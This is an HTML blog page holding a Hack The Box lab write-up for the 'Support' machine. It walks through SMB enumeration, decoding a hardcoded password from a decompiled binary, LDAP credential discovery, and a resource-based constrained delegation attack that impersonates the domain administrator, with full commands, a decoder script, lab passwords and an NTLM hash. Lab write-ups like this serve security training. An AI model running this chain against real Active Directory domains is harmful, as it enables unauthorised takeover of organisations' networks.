@@ -1,0 +1,292 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Support [Easy] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Support [Easy]"/>
+<meta name="twitter:description" content="scanning TARGET=10.129.127.180 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-02 22:27:15Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support."/>
+
+    <meta property="og:title" content="HTB - Support [Easy]" />
+<meta property="og:description" content="scanning TARGET=10.129.127.180 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 127 Simple DNS Plus88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-02 22:27:15Z)135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/support/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-07-31T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-07-31T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Support [Easy]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 31, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">scanning</h1>
+<pre tabindex="0"><code>TARGET=10.129.127.180 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-08-02 22:27:15Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49701/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+57028/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+domain: `support.htb0` `support.htb`
+</code></pre><h1 id="smb-enum">smb enum</h1>
+<pre tabindex="0"><code>&gt; smbclient -L \\\\10.129.127.180
+Password for [WORKGROUP\root]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        support-tools   Disk      support staff tools
+        SYSVOL          Disk      Logon server share
+
+
+&gt; smbclient -N \\\\10.129.127.180\\support staff tools
+
+smb: \&gt; ls
+  .                                   D        0  Wed Jul 20 13:01:06 2022
+  ..                                  D        0  Sat May 28 07:18:25 2022
+  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
+  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
+  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
+  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
+  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
+  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
+  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
+
+smb: \&gt; get UserInfo.exe.zip
+</code></pre><ul>
+<li>decompile this using dnspy, locate a protected method</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Text;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> UserInfo.Services
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Token: 0x02000006 RID: 6</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Protected</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> getPassword()
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">byte</span>[] array = Convert.FromBase64String(Protected.enc_password);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">byte</span>[] array2 = array;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; array.Length; i++)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ <span style="color:#ae81ff">223</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> Encoding.Default.GetString(array2);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Token: 0x04000005 RID: 5</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> enc_password = <span style="color:#e6db74">&#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// Token: 0x04000006 RID: 6</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;armando&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>create a python script to decode the password: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># private static byte[] key = Encoding.ASCII.GetBytes(&#34;armando&#34;);</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;armando&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># byte[] array = Convert.FromBase64String(Protected.enc_password);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># byte[] array2 = array;</span>
+</span></span><span style="display:flex;"><span>array <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(enc_password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># for (int i = 0; i &lt; array.Length; i++){</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># }</span>
+</span></span><span style="display:flex;"><span>array2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(array)):
+</span></span><span style="display:flex;"><span>    array2 <span style="color:#f92672">+=</span> chr(array[i] <span style="color:#f92672">^</span> key[i<span style="color:#f92672">%</span>len(key)] <span style="color:#f92672">^</span> <span style="color:#ae81ff">223</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># return Encoding.Default.GetString(array2);</span>
+</span></span><span style="display:flex;"><span>print(array2)
+</span></span></code></pre></div><ul>
+<li>connect via ldap</li>
+</ul>
+<pre tabindex="0"><code>&gt; ldapsearch -x -H ldap://support.htb -D &#39;support\ldap&#39; -w &#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#39; -b &#34;CN=Users,DC=support,DC=htb&#34;
+
+smith.rosario
+hernandez.stanley
+wilson.shelby
+anderson.damian
+thomas.raphael
+levine.leopoldo
+raven.clifton
+bardot.mary
+cromwell.gerard
+monroe.david
+west.laura
+langley.lucy
+daughtler.mabel
+stoll.rachelle
+ford.victoria
+</code></pre><ul>
+<li>the user support has a field called <code>info</code>, which contains this: <code>info: Ironside47pleasure40Watchful</code></li>
+<li>This is the password of <code>support</code>, login to get the user flag</li>
+</ul>
+<pre tabindex="0"><code>&gt; evil-winrm -i support.htb -u support -p &#39;Ironside47pleasure40Watchful&#39; 
+</code></pre><h1 id="pe">pe</h1>
+<ul>
+<li>AD enum</li>
+</ul>
+<pre tabindex="0"><code>&gt; bloodhound-python -d support.htb -u support -p Ironside47pleasure40Watchful -gc dc.support.htb -c all -ns 10.129.127.180
+</code></pre><h1 id="resourced-based-delegation">resourced based delegation</h1>
+<ul>
+<li>Follow this guide here to exploit: <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></li>
+<li>tool used: <a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></li>
+<li>Check if this account is allowed to create machines on the domain and how many attempts are left</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-DomainObject -Identity &#34;dc=support,dc=htb&#34; -Domain support.htb
+ms-ds-machineaccountquota: 10
+</code></pre><ul>
+<li>Check DC environment, needs to be at least winserver 2012</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-DomainController
+OSVersion: Windows Server 2022 Standard
+</code></pre><ul>
+<li>Check that the target machine doesn&rsquo;t have msds-allowedtoactonbehalfofotheridentity, in this case, our target is dc</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+name msds-allowedtoactonbehalfofotheridentity
+---- ----------------------------------------
+DC
+</code></pre><ul>
+<li>upload PowerView.ps1 to the target</li>
+<li>upload PowerMad to target and load the modeul</li>
+</ul>
+<pre tabindex="0"><code>&gt; wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+&gt; upload Powermad.ps1
+&gt; import-module .\Powermad.ps1
+</code></pre><ul>
+<li>Create a new machine object and let it be trusted by DC</li>
+</ul>
+<pre tabindex="0"><code>&gt; New-MachineAccount -MachineAccount MEOW -Password $(ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose
+</code></pre><ul>
+<li>Check the newly created computer object MEOW and note the SID</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-DomainComputer
+objectsid: S-1-5-21-1677581083-3380853377-188903654-5601
+</code></pre><ul>
+<li>Create a new raw security descriptor for the MEOW computer principal</li>
+</ul>
+<pre tabindex="0"><code>&gt; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)&#34;
+&gt; $SDBytes = New-Object byte[] ($SD.BinaryLength)
+&gt; $SD.GetBinaryForm($SDBytes, 0)
+</code></pre><ul>
+<li>Modify the target DC&rsquo;s AD object by applying the security descriptor bytes to the target WS01 machine</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-DomainComputer dc | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
+Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
+Verbose: [Get-DomainObject] Extracted domain &#39;support.htb&#39; from &#39;CN=DC,OU=Domain Controllers,DC=support,DC=htb&#39;
+Verbose: [Get-DomainSearcher] search base: LDAP://DC=support,DC=htb
+Verbose: [Get-DomainObject] Get-DomainObject filter string: (&amp;(|(distinguishedname=CN=DC,OU=Domain Controllers,DC=support,DC=htb)))
+Verbose: [Set-DomainObject] Setting &#39;msds-allowedtoactonbehalfofotheridentity&#39; to &#39;1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 27 219 253 99 129 186 131 201 230 112 66 11 225 21 0 0&#39; for object &#39;DC$&#39;
+</code></pre><ul>
+<li>Note that support belongs to &ldquo;Shared Support Accounts&rdquo; group which has GenericAll privilege to the DC; to exploit this, at least WRITE privilege is needed to the target. Otherwise, your request would have been denied.</li>
+<li>Check the write was successful</li>
+</ul>
+<pre tabindex="0"><code>&gt; Get-DomainComputer dc -Properties &#39;msds-allowedtoactonbehalfofotheridentity&#39;
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+</code></pre><ul>
+<li>impersonate administrator and gain access via a fake spn</li>
+</ul>
+<pre tabindex="0"><code>&gt; impacket-getST support.htb/meow -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+Password:
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+
+&gt; export KRB5CCNAME=administrator.ccache
+&gt; impacket-smbexec support.htb/administrator@dc.support.htb -no-pass -k
+</code></pre><ul>
+<li>dump hash and login for convenience</li>
+</ul>
+<pre tabindex="0"><code>&gt; evil-winrm -i support.htb -u administrator -H bb06cbc02b39abeddd1335bc30b19e26
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
